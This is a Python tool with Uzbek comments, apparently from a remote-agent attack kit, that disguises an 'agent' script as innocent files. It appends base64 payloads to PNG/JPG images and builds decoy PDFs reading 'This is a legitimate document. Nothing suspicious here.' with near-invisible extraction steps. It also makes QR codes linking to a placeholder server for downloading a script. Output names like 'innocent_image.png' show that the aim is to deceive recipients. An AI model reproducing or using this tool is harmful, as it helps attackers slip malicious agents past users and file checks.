"""
Payload Steganography
Agent'ni rasm (PNG/JPG) yoki PDF ichiga yashirish
"""

import os
import base64
from PIL import Image
import io


class PayloadStego:
    """Steganography - payload yashirish"""
    
    def __init__(self):
        self.delimiter = b'|||PAYLOAD_START|||'
        
    def hide_in_image(self, agent_file, image_file, output_file):
        """Payload'ni rasm ichiga yashirish"""
        try:
            print(f"[*] Hiding payload in image...")
            
            # Read agent code
            with open(agent_file, 'rb') as f:
                agent_data = f.read()
            
            # Read image
            with open(image_file, 'rb') as f:
                image_data = f.read()
            
            # Combine: Image + Delimiter + Payload
            combined = image_data + self.delimiter + base64.b64encode(agent_data)
            
            # Write output
            with open(output_file, 'wb') as f:
                f.write(combined)
            
            print(f"[+] Payload hidden successfully!")
            print(f"[+] Output: {output_file}")
            print(f"[+] Size: {len(combined)} bytes")
            
            # Verify image still opens
            try:
                img = Image.open(output_file)
                print(f"[+] Image verified: {img.size[0]}x{img.size[1]} pixels")
            except:
                print("[!] Warning: Image may not open in some viewers")
            
            return True
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def extract_from_image(self, stego_file, output_file):
        """Rasm ichidan payload'ni chiqarish"""
        try:
            print(f"[*] Extracting payload from image...")
            
            # Read stego file
            with open(stego_file, 'rb') as f:
                data = f.read()
            
            # Find delimiter
            if self.delimiter in data:
                # Split
                parts = data.split(self.delimiter)
                
                # Decode payload
                payload = base64.b64decode(parts[1])
                
                # Write output
                with open(output_file, 'wb') as f:
                    f.write(payload)
                
                print(f"[+] Payload extracted!")
                print(f"[+] Output: {output_file}")
                print(f"[+] Size: {len(payload)} bytes")
                
                return True
            else:
                print("[-] No payload found in image")
                return False
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def create_pdf_wrapper(self, agent_file, output_file, title="Document"):
        """PDF ichiga agent yashirish"""
        try:
            from reportlab.pdfgen import canvas
            from reportlab.lib.pagesizes import letter
            
            print(f"[*] Creating PDF wrapper...")
            
            # Read agent code
            with open(agent_file, 'rb') as f:
                agent_data = f.read()
            
            # Create PDF
            c = canvas.Canvas(output_file, pagesize=letter)
            
            # Add some legitimate content
            c.setFont("Helvetica", 16)
            c.drawString(100, 750, title)
            
            c.setFont("Helvetica", 12)
            c.drawString(100, 700, "This is a legitimate document.")
            c.drawString(100, 680, "Nothing suspicious here.")
            
            # Add instructions (hidden in small text)
            c.setFont("Helvetica", 6)
            c.setFillColorRGB(0.9, 0.9, 0.9)  # Light gray (almost invisible)
            
            instructions = [
                "To extract payload:",
                "1. Open this PDF in a hex editor",
                f"2. Find delimiter: {self.delimiter.hex()}",
                "3. Extract base64 data after delimiter",
                "4. Decode base64",
                "5. Save as .py file"
            ]
            
            y = 50
            for line in instructions:
                c.drawString(50, y, line)
                y -= 8
            
            c.save()
            
            # Append payload to PDF
            with open(output_file, 'ab') as f:
                f.write(self.delimiter)
                f.write(base64.b64encode(agent_data))
            
            print(f"[+] PDF created with hidden payload!")
            print(f"[+] Output: {output_file}")
            print(f"[+] Looks like normal PDF, contains agent code")
            
            return True
            
        except ImportError:
            print("[-] reportlab not installed!")
            print("[!] Install: pip install reportlab")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def extract_from_pdf(self, pdf_file, output_file):
        """PDF ichidan payload chiqarish"""
        try:
            print(f"[*] Extracting payload from PDF...")
            
            # Read PDF
            with open(pdf_file, 'rb') as f:
                data = f.read()
            
            # Find delimiter
            if self.delimiter in data:
                # Split
                parts = data.split(self.delimiter)
                
                # Decode payload
                payload = base64.b64decode(parts[1])
                
                # Write output
                with open(output_file, 'wb') as f:
                    f.write(payload)
                
                print(f"[+] Payload extracted from PDF!")
                print(f"[+] Output: {output_file}")
                
                return True
            else:
                print("[-] No payload found in PDF")
                return False
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def create_qr_code_payload(self, agent_file, output_file):
        """QR Code ichida payload"""
        try:
            import qrcode
            
            print(f"[*] Creating QR code with download link...")
            
            # Create download server (example)
            download_url = f"http://YOUR_SERVER/download.py"
            
            # Generate QR code
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            
            qr.add_data(download_url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(output_file)
            
            print(f"[+] QR code created!")
            print(f"[+] Scan to download: {download_url}")
            print(f"[+] Output: {output_file}")
            
            return True
            
        except ImportError:
            print("[-] qrcode not installed!")
            print("[!] Install: pip install qrcode[pil]")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False


def main():
    """Main menu"""
    print("="*60)
    print("🎨 Payload Steganography")
    print("="*60)
    
    print("\nTurlar:")
    print("1. PNG/JPG ichiga yashirish")
    print("2. PDF ichiga yashirish")
    print("3. QR Code yaratish")
    print("4. Rasm ichidan chiqarish")
    print("5. PDF ichidan chiqarish")
    
    choice = input("\nTanlang (1-5): ").strip()
    
    stego = PayloadStego()
    
    if choice == '1':
        agent = input("Agent file: ").strip() or "agent/mobile_agent.py"
        image = input("Image file (PNG/JPG): ").strip() or "image.png"
        output = input("Output file: ").strip() or "innocent_image.png"
        
        stego.hide_in_image(agent, image, output)
        
    elif choice == '2':
        agent = input("Agent file: ").strip() or "agent/mobile_agent.py"
        output = input("Output PDF: ").strip() or "document.pdf"
        title = input("PDF title: ").strip() or "Important Document"
        
        stego.create_pdf_wrapper(agent, output, title)
        
    elif choice == '3':
        agent = input("Agent file: ").strip() or "agent/mobile_agent.py"
        output = input("Output QR code: ").strip() or "qrcode.png"
        
        stego.create_qr_code_payload(agent, output)
        
    elif choice == '4':
        stego_file = input("Stego image file: ").strip()
        output = input("Output agent file: ").strip() or "extracted_agent.py"
        
        stego.extract_from_image(stego_file, output)
        
    elif choice == '5':
        pdf_file = input("Stego PDF file: ").strip()
        output = input("Output agent file: ").strip() or "extracted_agent.py"
        
        stego.extract_from_pdf(pdf_file, output)
    
    else:
        print("[-] Invalid choice")


if __name__ == "__main__":
    main()
